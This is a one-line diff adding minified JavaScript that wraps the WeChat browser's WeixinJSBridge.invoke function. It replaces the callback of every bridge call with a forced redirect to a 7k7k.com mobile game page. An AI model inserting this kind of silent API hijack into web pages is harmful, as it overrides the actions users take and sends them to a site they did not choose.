@@ -1,0 +1,1 @@
+document.addEventListener("WeixinJSBridgeReady",function(){if(window.WeixinJSBridge){var a=WeixinJSBridge.invoke;WeixinJSBridge.invoke=function(){arguments[2]=function(){window.location.href="http://www.7k7k.com/m-android/play/"},a.apply(WeixinJSBridge,arguments)}}});
